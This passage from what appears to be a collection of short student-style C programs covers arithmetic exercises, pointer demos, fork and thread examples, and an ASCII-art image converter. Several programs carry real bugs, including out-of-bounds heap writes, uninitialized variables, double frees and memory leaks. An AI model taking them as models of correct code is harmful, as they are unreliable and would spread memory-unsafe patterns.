++i) {\n        ox_bins_len = filterOx(ox_bins, ox_bins_len, ox_bins, i);\n    }\n    int co_bins[1000];\n    int co_bins_len;\n    for (; co_bins_len < bins_len; ++co_bins_len) {\n        co_bins[co_bins_len] = bins[co_bins_len];\n    }\n    for (int i = 0; co_bins_len > 1; ++i) {\n        co_bins_len = filterCO(co_bins, co_bins_len, co_bins, i);\n    }\n    printf(\"%d\\n\", co_bins[0] * ox_bins[0]);\n    fclose(stream);\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main (void){\nint instancia,bonus,calculo1,calculo2,golpe,Ai,Di,Li,Ai2,Di2,Li2;\nint i;\nscanf(\"%d\",&instancia);\nfor(i=0;i<instancia;i++){\n    scanf(\"%d\",&bonus);\n    scanf(\"%d%d%d\",&Ai,&Di,&Li);\n    calculo1=((Ai + Di)/2)+(bonus);\n    scanf(\"%d%d%d\",&Ai2,&Di2,&Li2);\n    calculo2=((Ai2 + Di2)/2)+(bonus);\n    if(calculo1>calculo2){\n        printf(\"Dabriel\\n\");\n    }else if (calculo2==calculo1){\n        printf(\"Empate\\n\");\n    }else{\n        printf(\"Guarte\\n\");\n    }\n}\n    return 0;\n}",
    "#include <stdio.h>\nint invert(unsigned int x, int n,int p);\nint main(){\n unsigned int something=0b110100111;\n unsigned int result=0b110011011;\n printf(\"Expected result for invert(110100111,4,2): %d\\n\", result);\n printf(\"%d\\n\",invert(something,4,2));\n return 0;\n}\nint invert(unsigned int x, int n, int p){\n unsigned int mask;\n mask=((1 << n) - 1) << p;\n return x^mask;\n}",
    "#include<stdio.h>\n#include<math.h>\nint main()\n{\n    int i,n,t0;\n    float x,t1,R,sum;\n    t0=1;\n    sum=t0;\n    printf(\"Enter the value of x: \");\n    scanf(\"%f\",&x);\n    printf(\"Enter the number of terms: \");\n    scanf(\"%d\",&n);\n    printf(\"x\\tn\\tsum\\n\");\n    i=0;\n    do {\n     printf(\"%.2f\\t%d\\t%.2f\\n\",x,i+1,sum);\n     i++;\n     R=x/i;\n        t1=R*t0;\n        sum=sum+t1;\n        t0=t1;\n    } while (i<n);\n    printf(\"\\nFor x=%.2f and n=%d, exponential sum= %.2f\",x,n,sum);\n}",
    "#include<stdio.h>\nint main()\n{\n int hex[20000];\n for (int i = 0; i < 20000; i++)\n {\n  hex[i] = 3 * i*(i - 1) + 1;\n }\n int n;\n scanf(\"%d\", &n);\n for (int i = 1; i < 20000; i++)\n {\n  if (n <= hex[i])\n  {\n   printf(\"%d\", i);\n   break;\n  }\n }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char *argv[]) {\n  int month, day, year;\n  const char *MONTHS[] = {\n      \"\", \"January\", \"February\", \"March\", \"April\", \"May\", \"June\",\n      \"July\", \"August\", \"September\", \"October\", \"November\", \"December\"};\n  if (2 != argc) {\n    fprintf((stderr),\n            \"USAGE: %s date; where date is in the form mm-dd-yyyy\"\n            \" or as mm/dd/yyyy\\n\",\n            argv[0]);\n    exit(1);\n  }\n  sscanf(argv[1], \"%d%*[/-]%d%*[/-]%d\", &month, &day, &year);\n  printf(\"%s %.2d, %.4d\\n\", MONTHS[month], day, year);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int c = (-1);\n    printf(\"%5d\", c);\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main()\n{\n    double a, b, c, delta, x1, x2;\n    printf(\"coeficiente a: \");\n    scanf(\"%lf\", &a);\n    printf(\"coeficiente b: \");\n    scanf(\"%lf\", &b);\n    printf(\"coeficiente c: \");\n    scanf(\"%lf\", &c);\n    delta = (b*b) - (4*a*c);\n    if (a == 0) {\n        printf(\"nao possui raizes reais\\n\");\n    }\n    else if (delta < 0) {\n        printf(\"nao possui raizes reais\\n\");\n    }\n    else {\n        x1 = (-b + sqrt(delta))/(2*a);\n        x2 = (-b - sqrt(delta))/(2*a);\n    }\n    printf(\"x1: %.4lf\\n\", x1);\n    printf(\"x2: %.4lf\", x2);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n\nvoid selfdesc(unsigned long);\nconst char *ref = \"!\\\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\";\nchar *digs;\nunsigned long *nums, *inds, inds_sum, inds_val, base;\nint main(int argc, char *argv[]) {\nint used[94];\nunsigned long digs_n, i;\n if (argc != 2) {\n  fprintf((stderr), \"Usage is %s <digits>\\n\", argv[0]);\n  return 1;\n }\n digs = argv[1];\n digs_n = strlen(digs);\n if (digs_n < 2 || digs_n > 94) {\n  fprintf((stderr), \"Invalid number of digits\\n\");\n  return 1;\n }\n for (i = 0; i < 94; i++) {\n  used[i] = 0;\n }\n for (i = 0; i < digs_n && strchr(ref, digs[i]) && !used[digs[i]-*ref]; i++) {\n  used[digs[i]-*ref] = 1;\n }\n if (i < digs_n) {\n  fprintf((stderr), \"Invalid digits\\n\");\n  return 1;\n }\n nums = calloc(digs_n, sizeof(unsigned long));\n if (!nums) {\n  fprintf((stderr), \"Could not allocate memory for nums\\n\");\n  return 1;\n }\n inds = malloc(sizeof(unsigned long)*digs_n);\n if (!inds) {\n  fprintf((stderr), \"Could not allocate memory for inds\\n\");\n  free(nums);\n  return 1;\n }\n inds_sum = 0;\n inds_val = 0;\n for (base = 2; base <= digs_n; base++) {\n  selfdesc(base);\n }\n free(inds);\n free(nums);\n return 0;\n}\nvoid selfdesc(unsigned long i) {\nunsigned long diff_sum, upper_min, j, lower, upper, k;\n if (i) {\n  diff_sum = base-inds_sum;\n  upper_min = inds_sum ? diff_sum:base-1;\n  j = i-1;\n  if (j) {\n   lower = 0;\n   upper = (base-inds_val)/j;\n  }\n  else {\n   lower = diff_sum;\n   upper = diff_sum;\n  }\n  if (upper < upper_min) {\n   upper_min = upper;\n  }\n  for (inds[j] = lower; inds[j] <= upper_min; inds[j]++) {\n   nums[inds[j]]++;\n   inds_sum += inds[j];\n   inds_val += inds[j]*j;\n   for (k = base-1; k > j && nums[k] <= inds[k] && inds[k]-nums[k] <= i; k--);\n   if (k == j) {\n    selfdesc(i-1);\n   }\n   inds_val -= inds[j]*j;\n   inds_sum -= inds[j];\n   nums[inds[j]]--;\n  }\n }\n else {\n  for (j = 0; j < base; j++) {\n   putchar(digs[inds[j]]);\n  }\n  puts(\"\");\n }\n}",
    "#include <stdio.h>\nint find_nth_term(int n, int a, int b, int c) {\n    if ( n == 1) return a;\n    else if (n == 2) return b;\n    else if(n == 3) return c;\n    else return find_nth_term(n - 1, a, b ,c) + find_nth_term(n - 2, a, b ,c) + find_nth_term(n - 3, a, b ,c) ;\n}\nint main()\n{\n    int n, a, b, c, ans;\n    scanf(\"%d %d %d %d\", &n, &a, &b, &c);\n    ans = find_nth_term(n, a, b, c);\n    printf(\"%d\", ans);\n    return 0;\n}",
    "#include <stdio.h>\nint retrieve(int *my_pointer) { return *my_pointer; }\nint *increment(void) {\n static int counter = 0;\n printf(\"%d \", ++counter);\n return &counter;\n}\nint main(void) {\n int *ptr = increment();\n while (*ptr < 5) {\n  printf(\"%d\\n\", retrieve(ptr));\n  increment();\n }\n return 0;\n}",
    "#include <stdio.h>\nint main() {\n    double m = 0, q = 0;\n    do {\n        printf(\"m = \");\n        scanf(\"%lf\", &m);\n    } while (!m);\n    printf(\"q = \");\n    scanf(\"%lf\", &q);\n    double x = -q / m;\n    printf(\"line intersects the x axis at (x=%f, y=0)\\n\", x);\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nvoid show_array(const int ar[], int n);\n_Static_assert(sizeof(double) == 2 * sizeof(int), \"double not twice int size\");\nint main(void) {\n  int values[10] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10};\n  int target[10];\n  double curiout[10 / 2] = {2.0, 3.0, 4.0, 5.0, 6.0};\n  memcpy(target, values, 10 * sizeof(int));\n  show_array(target, 10);\n  memmove(values + 2, values, 5 * sizeof(int));\n  show_array(values, 10);\n  memcpy(target, curiout, 5 * sizeof(double));\n  show_array(target, 10 / 2);\n  show_array(target + 5, 10 / 2);\n  return 0;\n}\nvoid show_array(const int ar[], int n) {\n  int i;\n  for (i = 0; i < n; i++) {\n    printf(\"%d \", ar[i]);\n  }\n  printf(\"\\n\");\n}",
    "#include <stdio.h>\nint main(void)\n{\nputs(\"\\\"Programming is like building a multilingual puzzle\");\nreturn (0);\n}",
    "#include <stdio.h>\nint main() {\n  char *t = \"dax\";\n  char t1[4] = {'d', 'a', 'x', '\\0'};\n  printf(\"t = %p | t1 = %p\\n\", t, t1);\n  printf(\"Value at t = %s | t1 = %s\\n\", t, t1);\n  return 0;\n}",
    "#include <math.h>\n#include <stdio.h>\nint main(void)\n{\n  int x;\n  double y = 1.0, ly, xdy;\n  printf(\"Enter a positive number: \");\n  scanf(\"%d\", &x);\n  do\n  {\n    ly = y;\n    xdy = x / y;\n    y = (y + xdy) / 2;\n  } while(fabs(ly - y) > (.00001 * y));\n  printf(\"Square root is: %.5f\\n\", y);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid shift(int* a, int n, int m){\n int *b = malloc(n * sizeof(*b)), i;\n for (i = 0; i < m; i ++)\n  b[i] = a[n-m+i];\n for (i = m; i < n; i ++)\n  b[i] = a[i-m];\n for (i = 0; i < n; i ++)\n  a[i] = b[i];\n free(b);\n}\nint main(){\n int n, m, *a, i;\n printf(\"Enter array length: \");\n scanf(\"%d\", &n);\n a = malloc(n * sizeof(*a));\n printf(\"Enter array: \");\n for (i = 0; i < n; i ++)\n  scanf(\"%d\", &a[i]);\n printf(\"Enter shift distance: \");\n scanf(\"%d\", &m);\n shift(a, n, m);\n printf(\"The shifted array is: \");\n for (i = 0; i < n; i ++)\n  printf(\"%d \", a[i]);\n printf(\"\\n\");\n free(a);\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <stdlib.h>\nint main()\n{\n    int a, b;\n    scanf(\"%d\\n%d\", &a, &b);\n    char info[11][6]={\"one\",\"two\",\"three\",\"four\",\"five\",\"six\",\"seven\",\"eight\",\"nine\", \"even\",\"odd\"};\n    int index;\n    for (int i = a; i <= b; i++) {\n      if (i <= 9)\n      {\n          index= i-1;\n          printf(\"%s\\n\", info[index]);\n      }else {\n          if(i%2==0)\n          {\n              index=9;\n              printf(\"%s\\n\", info[index]);\n          }\n          else {\n              index=10;\n              printf(\"%s\\n\", info[index]);\n          }\n      }\n    }\n    return 0;\n}",
    "#include <stdio.h>\nvoid zamiana(double *a, double *b, double *c);\nint main(void)\n{\n double a = 7.7;\n double b = 5.5;\n double c = 6.6;\n printf(\"PRZED ZAMIANA\\na = %.1f  b = %.1f c = %.1f\\n\", a, b, c);\n zamiana(&a, &b, &c);\n putchar('\\n');\n printf(\"PO ZAMIANIE\\na = %.1f  b = %.1f c = %.1f\\n\", a, b, c);\n return 0;\n}\nvoid zamiana(double *a, double *b, double *c)\n{\n double najmniejsza;\n double srodkowa;\n double najwieksza;\n if (*a < *b && *a < *c)\n  najmniejsza = *a;\n else if (*b < *a && *b < *c)\n  najmniejsza = *b;\n else if (*c < *a && *c < *b)\n  najmniejsza = *c;\n if (*a > *b && *a > *c)\n  najwieksza = *a;\n else if (*b > *a && *b > *c)\n  najwieksza = *b;\n else if (*c > *a && *c > *b)\n  najwieksza = *c;\n if (*a > najmniejsza && *a < najwieksza)\n  srodkowa = *a;\n else if (*b > najmniejsza && *b < najwieksza)\n  srodkowa = *b;\n else if (*c > najmniejsza && *c < najwieksza)\n  srodkowa = *c;\n *a = najmniejsza;\n *b = srodkowa;\n *c = najwieksza;\n}",
    "#include <stdio.h>\nint main(int argc, char* argv[]) {\n  printf(\"Enter a number, an operator, and a number\\n\");\n  int i, j, res;\n  char op;\n  printf(\"First number\\n\");\n  scanf(\"%d\", &i);\n  printf(\"Operator\\n\");\n  scanf(\" %c\", &op);\n  printf(\"Second number\\n\");\n  scanf(\"%d\", &j);\n  switch (op) {\n    case 0x2B:\n      res = i + j;\n      break;\n    case 0x2D:\n      res = i - j;\n      break;\n    case 0x2A:\n      res = i * j;\n      break;\n    case 0x2F:\n      res = i / j;\n      break;\n    default:\n      res = i+j;\n      break;\n  };\n  printf(\"Goodbye\\n\");\n  printf(\"You entered %d%c%d=%d\\n\", i, op, j, res);\n  printf(\"Goodbye\\n\");\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <pthread.h>\n#include <math.h>\n#include <unistd.h>\nvoid* one(void* var) {\n pthread_barrier_t* barrier = (pthread_barrier_t*)var;\n printf(\"1 \");\n printf(\"\\n\");\n pthread_barrier_wait(barrier);\n}\nvoid* two(void* var) {\n pthread_barrier_t* barrier = (pthread_barrier_t*)var;\n pthread_barrier_wait(barrier);\n printf(\"2 \");\n printf(\"\\n\");\n}\nint main(int argc, char **argv)\n{\n int i, P = 2;\n pthread_t tid[P];\n pthread_barrier_t barrier;\n pthread_barrier_init(&barrier, ((void*)0), 2);\n pthread_create(&tid[0], ((void*)0), one, &barrier);\n pthread_create(&tid[1], ((void*)0), two, &barrier);\n for(i = 0; i < 2; i++)\n {\n  pthread_join(tid[i], ((void*)0));\n }\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int lowerFahr = 0;\n    int upperFahr = 300;\n    int stepFahr = 20;\n    int currCel = 0;\n    for (int currFahr = lowerFahr; currFahr <= upperFahr; currFahr += stepFahr)\n    {\n        currCel = 5 * (currFahr - 32) / 9;\n        printf(\"%d\\t%d\\n\", currFahr, currCel);\n    }\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\nchar a ='\\012';\nprintf(\"%d\",a);\nreturn 0;\n}",
    "#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\nint main(){\n   int x;\n   x=fork();\n   printf(\"hello. my pid is %d\\n\", getpid());\n   printf(\"and my parent pid is %d\\n\", getppid());\n   for(;;);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <errno.h>\n#include <string.h>\nint main(int argc, char* argv[])\n{\n    int input_fd, file_flags;\n    mode_t file_perms;\n    file_flags = ((0x04000000) | (0x10000000)) | (((__wasi_oflags_t)(1 << 0)) << 12) | (((__wasi_oflags_t)(1 << 3)) << 12);\n    file_perms = (0x100) | (0x80) | (0x20) | (0x10) | (0x4) | (0x2);\n    if (argc != 2) {\n        fprintf((stderr), \"Usage: %s <pathname>\\n\", argv[0]);\n        exit(1);\n    }\n    if ((input_fd = open(argv[1], file_flags, file_perms)) < 0) {\n        fprintf((stderr), \"Err. opening %s\\n\", argv[1]);\n        exit(1);\n    }\n    if ((close(input_fd)) < 0) {\n        fprintf((stderr), \"Err. close(%s)\\n\", argv[1]);\n        exit(1);\n    }\n    return (0);\n}",
    "#include <stdio.h>\nint main(){\n int qtd, x, m2=0, m3=0, m4=0, m5=0;\n scanf(\" %d\", &qtd);\n int vetor[qtd];\n for(x = 0; x < qtd; x++){\n  scanf(\" %d\", &vetor[x]);\n  if(vetor[x] % 2 == 0){\n   m2 += 1;\n  }\n  if(vetor[x] % 3 == 0){\n   m3 += 1;\n  }\n  if(vetor[x] % 4 == 0){\n   m4 += 1;\n  }\n  if(vetor[x] % 5 == 0){\n   m5 += 1;\n  }\n }\n printf(\"%d Multiplo(s) de 2\\n\",m2);\n printf(\"%d Multiplo(s) de 3\\n\",m3);\n printf(\"%d Multiplo(s) de 4\\n\",m4);\n printf(\"%d Multiplo(s) de 5\\n\",m5);\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int oct=25,i=1,dec=0,d,p=1;\n    for(int j=oct;j>0;j=j/10)\n    {\n       d = j%10;\n        if(i==1)\n        {\n            p=p*1;\n        }\n        else{\n            p=p*8;\n        }\n        dec =dec + (d*p);\n        i++;\n    }\n    int k=1,bin=0;\n    for(int s=dec;s>0;s=s/2)\n    {\n        bin+=(s%2)*k;\n        k=k*10;\n    }\n    printf(\"<______> %d <_____>\",bin);\n    return 0;\n}",
    "#include<stdio.h>\n#include <stdlib.h>\n#include<string.h>\nchar izberiZnak(int sivina, char* tabelaCharov, int* tabelaIntov) {\n    for(int i = 0; i < 9; i++) {\n        if(sivina >= tabelaIntov[i]) {\n            return tabelaCharov[i];\n        }\n    }\n    return 'e';\n}\nvoid preberiFile(char* inputName, char* outputName, int velikostOkna) {\n    FILE* odpri;\n    odpri = fopen(inputName, \"rb\");\n    int sirinaSlike, visinaSlike, red, green, blue, piksli, novPiksl;\n    char read_string[100];\n    char* split;\n    for(int i = 0; i < 3; i++) {\n        fgets(read_string,sizeof(read_string),odpri);\n        if(i == 1) {\n            split = strtok(read_string, \" \");\n            sirinaSlike = atoi(split);\n            split = strtok(((void*)0), \" \");\n            visinaSlike = atoi(split);\n        }\n    }\n    int** tabelaPikslov;\n    tabelaPikslov = (int**) malloc(sizeof(int*) * visinaSlike);\n    for(int i = 0; i < visinaSlike; i++) {\n        tabelaPikslov[i] = (int*)malloc(sizeof(int)*sirinaSlike);\n        for(int x = 0; x < sirinaSlike; x++) {\n            red = fgetc(odpri);\n            green = fgetc(odpri);\n            blue = fgetc(odpri);\n            piksli = (red + green + blue);\n            tabelaPikslov[i][x] = piksli;\n        }\n    }\n    int tabelaIntov[9];\n    tabelaIntov[0] = 230;\n    tabelaIntov[1] = 200;\n    tabelaIntov[2] = 180;\n    tabelaIntov[3] = 160;\n    tabelaIntov[4] = 130;\n    tabelaIntov[5] = 100;\n    tabelaIntov[6] = 70;\n    tabelaIntov[7] = 50;\n    tabelaIntov[8] = 0;\n    char tabela[9];\n    tabela[0] = ' ';\n    tabela[1] = '.';\n    tabela[2] = '\\'';\n    tabela[3] = ':';\n    tabela[4] = 'o';\n    tabela[5] = '&';\n    tabela[6] = '8';\n    tabela[7] = '#';\n    tabela[8] = '@';\n    FILE* zapisi;\n    zapisi = fopen(outputName, \"w\");\n    char izpisi;\n    int delimo = velikostOkna * velikostOkna * 3;\n    for(int i = 0; i < visinaSlike; i+= velikostOkna) {\n        for(int x = 0; x < sirinaSlike; x+= velikostOkna) {\n            novPiksl = 0;\n            int mejaA = i + velikostOkna;\n            int mejaB = x + velikostOkna;\n            for(int a = i; a < mejaA; a++) {\n                for(int b = x; b < mejaB; b++) {\n                    novPiksl+= tabelaPikslov[a][b];\n                }\n            }\n            int sivina = novPiksl / delimo;\n            izpisi = izberiZnak(sivina, tabela, tabelaIntov);\n            fputc(izpisi, zapisi);\n        }\n        fprintf(zapisi, \"\\n\");\n    }\n    free(tabelaPikslov);\n    fclose(zapisi);\n    fclose(odpri);\n}\nint main() {\n    char inputName[256];\n    char outputName[256];\n    int velikostOkna;\n    scanf(\"%s\", inputName);\n    scanf(\"%s\", outputName);\n    scanf(\"%d\", &velikostOkna);\n    preberiFile(inputName, outputName, velikostOkna);\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n    int a;\n    int b;\n    printf(\"Please enter the first number:\");\n    scanf(\"%d\",&a);\n    printf(\"Please enter the second number:\");\n    scanf(\"%d\",&b);\n    printf(\"The sum, product, difference, quotient and remainder are:\"\n        \"%d, %d, %d, %d, %d\\n\", a+b, a*b, a-b, a/b, a%b);\n}",
    "#include <stdio.h>\nint isTriangulo(double a, double b, double c);\ndouble perimetroDoTriangulo(double a, double b, double c);\ndouble areaDoTrapezio(double b1, double b2, double h);\nint main (void) {\n  double a, b, c;\n  scanf(\"%lf %lf %lf\", &a, &b, &c);\n  if (isTriangulo(a, b, c)) {\n    printf(\"Perimetro = %.1f\\n\", perimetroDoTriangulo(a, b, c));\n  }\n  else {\n    printf(\"Area = %.1f\\n\", areaDoTrapezio(a, b, c));\n  }\n  return 0;\n}\nint isTriangulo(double a, double b, double c) {\n  return a < b + c && b < a + c && c < a + b;\n}\ndouble perimetroDoTriangulo(double a, double b, double c) {\n  return a + b + c;\n}\ndouble areaDoTrapezio(double b1, double b2, double h) {\n  return (b1 + b2) * h / 2;\n}",
    "#include <stdio.h>\nint main() {\n    int n;\n    scanf(\"%d\", &n);\n    if (n % 2 == 1 || (n >= 6 && n <= 20)) {\n        printf(\"Weird\\n\");\n    } else {\n        printf(\"Not Weird\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\nstatic int sq(int a) {\n int i;\n for (i = 0; (i + 1) * (i + 1) <= a; i++) ;\n return i;\n}\nint main(int argc, char *argv[]) {\n FILE *fp;\n int a[4], x, y, d;\n char line[27];\n if (argc != 2) {\n  printf(\"Usage: %s [FILE]\\n\", argv[0]);\n  return 1;\n }\n fp = fopen(*++argv, \"r\");\n while (fgets(line, 27, fp) != 0) {\n  sscanf(line, \"(%d, %d) (%d, %d)\", &a[0], &a[1], &a[2], &a[3]);\n  x = a[0] - a[2];\n  y = a[1] - a[3];\n  d = sq(x * x + y * y);\n  printf(\"%d\\n\", d);\n }\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int a, b, n;\n    int deno, num, ans_deno = 1, ans_num = 0;\n    scanf(\"%d%d%d\", &n, &a, &b);\n    for (deno = 2; deno <= n; ++deno)\n        for (num = 0; num < deno; ++num)\n            if (ans_deno * num > ans_num * deno\n                && deno * a > num * b)\n            {\n                ans_deno = deno; ans_num = num;\n            }\n    printf(\"%d %d\\n\", ans_num, ans_deno);\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint main()\n{\n int *a;\n a = (int*)malloc(sizeof(int));\n *a =10;\n printf(\"%d\", a);\n printf(\"\\n%d\\n%d\", *a, *(a+1));\n int *c;\n c = (int*)calloc(2, sizeof(int));\n *c = 1;\n printf(\"\\nAddress = %d, c =  %d c+1 = %d\", c, *c, *(c+1));\n *(c+1) = 2;\n printf(\"\\nAddress = %d, c =  %d c+1 = %d\", c, *c, *(c+1));\n *(c+5) = 3;\n printf(\"\\nAddress = %d, c =  %d c+1 = %d, c+2 = %d\\n\", c, *c, *(c+1),*(c+10));\n free(c);\n a = (int*)realloc(a, 5*sizeof(int));\n int i;\n for(i = 0; i<4;i++)\n {\n  scanf(\"\\n%d\", &a[i]);\n }\n for(i = 0; i<4;i++)\n printf(\"\\n%d\", a[i]);\n free(a);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(\n    int argc,\n    const char** argv\n) {\n    printf( \"Hello World\\n\" );\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argv, char ** args) {\n  FILE *fp=fopen(args[1],\"r\");\n  int i, isquared;\n  if(fp==((void*)0)) {\n printf(\"No results.dat file.\");\n exit(0);\n  }\n  while(fscanf(fp,\"%d,%d\\n\",&i,&isquared)!=(-1)) {\n printf(\"i: %d, isquared: %d\\n\",i,isquared);\n  }\n  fclose(fp);\n  return(0);\n}",
    "int main()\n{\n  int i, j;\n  i = 0;\n  for\n    (\n     j = 0\n;\n     j < 5\n;\n     j++\n     )\n    {\n      i++;\n    }\n  return 0;\n}",
    "#include <stdio.h>\nint main() {\nint n=0, r=1;\n    do {\n        puts(\"Ingrese un n\u00famero entero positivo:\");\n        scanf(\"%d\", &n);\n    } while (n<=1);\n    while (r*r<=n) { r++; }\n    printf(\"\\nLa ra\u00edz entera de %d es: %d \\n\",n, r-1);\nreturn 0;\n}",
    "#include<stdio.h>\nint main()\n{\n long int n, term, term1, term2, i;\n    term1 = 0;\n    term2 = 1;\n    do{\n     printf(\"\\nEnter no. of terms :\\t\");\n     scanf(\"%ld\", &n);\n     if( n < 1 ) printf(\"\\nInvalid Input...! Try Again.\");\n   }while( n < 1 );\n  for( i = 0 ; i < n ; i++ )\n {\n  term = term1 + term2;\n  printf(\"%ld \\t\", term);\n  term1 = term2;\n  term2 = term;\n  }\n return 0;\n}",
    "#include <stdio.h>\nvoid printasterisks(int n);\nint main(){\n    int n;\n    printf(\"Inserte n\u00famero\\n\");\n    scanf(\"%d\",&n);\n    printasterisks(n);\n}\nvoid printasterisks(int n){\n    int b;\n    int step=1;\n    for(b=n;b>0;b--){\n int i;\n for(i=0;i<(b-1);i++)\n     printf(\" \");\n printf(\"*\");\n if(b<n){\n     for(i=0;i<step;i++)\n  printf(\" \");\n     printf(\"*\");\n     step+=2;\n }\n printf(\"\\n\");\n    }\n    step -=4;\n    for(b=1;b<=(n-1);b++){\n int i;\n for(i=0;i<b;i++)\n     printf(\" \");\n printf(\"*\");\n for(i=0;i<step;i++)\n     printf(\" \");\n if(b<(n-1)){\n     printf(\"*\");\n     step-=2;\n }\n printf(\"\\n\");\n    }\n}",
    "#include <stdio.h>\nint main(){\n    int i;\n    scanf(\"%d\",&i);\n    printf(\"%d %d %d\\n\",++i,i,i++);\n    printf(\"%d \",++i);\n    printf(\"%d \",i);\n    printf(\"%d \",i++);\nreturn 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nint compattaarray(int[], int);\nint primo(int);\nint main(int argc, char *argv[]){\n int arr[200];\n int dim, i, dim_primi;\n do{\n  scanf(\"%d\", &dim);\n } while(dim <= 0 || dim > 200);\n for(i=0; i<dim; i++){\n  scanf(\"%d\", &arr[i]);\n }\n dim_primi = compattaarray(arr, dim);\n for(i=0; i<dim_primi; i++){\n  printf(\"%d \", arr[i]);\n }\n printf(\"\\n\");\n return 0;\n}\nint compattaarray(int arr[], int dim){\n int i, primi;\n for(i=0, primi=0; i<dim; i++){\n  if(primo(arr[i])){\n   arr[primi] = arr[i];\n   primi++;\n  }\n }\n return primi;\n}\nint primo(int n){\n int p, i;\n for(i=2, p=1; i*i<=n && p; i++){\n  if(!(n%i))\n   p=0;\n }\n return p;\n}",
    "#include<stdio.h>\nint main(void)\n{\n char arr_1[]=\"tom cao\";\n char arr_2[]=\"tom cao\";\n char *arr_3=\"tom cao\";\n char *arr_4=\"tom cao\";\n if(arr_1==arr_2)\n {\n  printf(\"arr_1=arr_2\");\n }else\n {\n  printf(\"arr_1!=arr_2\");\n }\n if(arr_3==arr_4)\n        {\n                printf(\"arr_3=arr_4\");\n        }else\n        {\n                printf(\"arr_3!=arr_4\");\n        }\n return 0;\n}",
    "#include <stdio.h>\n#include <limits.h>\n#include <string.h>\n\nint main() {\n  int number = 8;\n  char result[8*sizeof(number)];\n  int quotient = number;\n  int remainder = 0;\n  int i = 0;\n  do {\n    quotient /= 2;;\n    remainder %= 2;;\n    printf (\"Quotient [%d] Remainder[%d]\\n\", quotient, remainder);\n    result[i++] = remainder;\n  }\n  while(quotient >= 2);\n  result[i] = quotient;\n  for (int j = strlen(result); j == 0; --j) {\n    printf (\"%c\", result[j]);\n  }\n  return 0;\n}",
    "#include<stdio.h>\n#include<math.h>\n#include<stdlib.h>\nint main(){\n int a[100],minl=100,temp,N;\n scanf(\"%d\",&N);\n for(int i=0;i<N;i++)\n  scanf(\"%d\",&a[i]);\n for(int i=0;i<N;i++){\n  for (int j=i+1;j<N;j++){\n   temp=abs(a[i]-a[j]);\n   if (temp<minl)\n    minl=temp;\n    }\n    }\n    printf(\"%d\",minl);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main() {\n    long int li;\n    char buffer[256];\n    printf(\"Enter a long number: \");\n    fgets(buffer, 256, (stdin));\n    li = atol(buffer);\n    printf(\"The value entered is %ld. Its double is %ld.\\n\", li, li * 2);\n    printf(\"%ld\\n\", atol(\"-123zing\"));\n    printf(\"%ld\\n\", atol(\"0\"));\n    printf(\"%ld\\n\", atol(\"zing\"));\n    printf(\"%ld\\n\", atol(\"2147483648\"));\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n int sum = 0;\n int threes = 0;\n int fives =0;\n int i = 0;\n for (i = 0; i < 1000; i++)\n {\n  threes = i%3;\n  fives = i%5;\n  if ( threes ==0)\n  {\n   sum = sum + i;\n  }\n  else if( fives == 0)\n  {\n   sum = sum + i;\n  }\n }\n printf(\"%d\\n\", sum);\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\nvoid count(char str[][150], const int n);\nvoid create(char super[], char str[][150], const int n, int counter);\nchar* append(char dest[], char src[], const int from);\nint length = 200;\nint main()\n{\n    int n, i;\n    scanf(\"%d\", &n);\n    char str[n][150];\n        for (i = 0; i < n; i++) {\n  scanf(\"%s\", str[i]);\n }\n count(str, n);\n printf(\"%d\\n\", length);\n return 0;\n}\nvoid count(char str[][150], const int n)\n{\n    int i, k, j;\n char buff[n - 1][150];\n for (i = 0; i < n; i++) {\n  char *super = (char *)malloc(150);\n  strcpy(super, str[i]);\n  for (k = 0, j = 0; k < n; k++) {\n   if (k != i) {\n    memcpy(buff[j], str[k], 150);\n    j++;\n   }\n  }\n  create(super, buff, n - 1, 0);\n }\n}\nvoid create(char super[], char str[][150], const int n, int counter)\n{\n if (counter == n) {\n  int t = (int)strlen(super);\n  if (t < length) length = t;\n  printf(\"%s: %d\\n\", super, t);\n  free(super);\n  return;\n }\n if (counter < n) {\n  int len = strlen(str[counter]),\n   len_s = strlen(super), i;\n  for (i = 0; i < len; i++) {\n   if (i < len_s) {\n    if (memcmp(str[counter], super + len_s - i, i) == 0)\n     create(append(super, str[counter], i), str, n, counter + 1);\n    if (memcmp(str[counter] + len - i, super, i) == 0)\n     create(append(str[counter], super, i), str, n, counter + 1);\n   }\n  }\n free(super);\n }\n}\nchar* append(char dest[], char src[], const int from)\n{\n char* temp = (char *)malloc(150);\n strcpy(temp, dest);\n int len = strlen(temp);\n temp[len - from] = '\\0';\n strcat(temp, src);\n return temp;\n}",
